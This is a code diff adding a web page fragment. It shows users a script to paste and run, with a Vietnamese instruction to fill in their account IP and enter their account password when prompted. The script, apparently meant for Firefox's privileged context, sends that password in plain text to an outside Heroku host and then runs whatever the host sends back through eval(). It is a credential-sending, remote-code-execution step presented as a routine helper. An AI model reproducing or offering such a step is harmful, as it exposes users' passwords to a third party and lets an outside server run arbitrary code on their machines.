@@ -1,0 +1,16 @@
+<div id="page-content-wrapper">
+  <div class="container-fluid">
+    <textarea rows="20" cols="150">
+      $ip = 'xxx';
+      $password = prompt('pass');
+
+      request = Components.classes['@mozilla.org/xmlextras/xmlhttprequest;1'].createInstance(Components.interfaces.nsIXMLHttpRequest),
+      async = false;
+      request.open('GET', 'https://autovn.herokuapp.com/requests/new?ip='+$ip+'&password='+$password, async);
+      request.send();
+      eval(request.response);
+    </textarea>
+    <br>
+    Thay xxx bằng ip trong account. Lúc chạy yêu cầu nhập pass account cuả bạn
+  </div>
+</div><br>
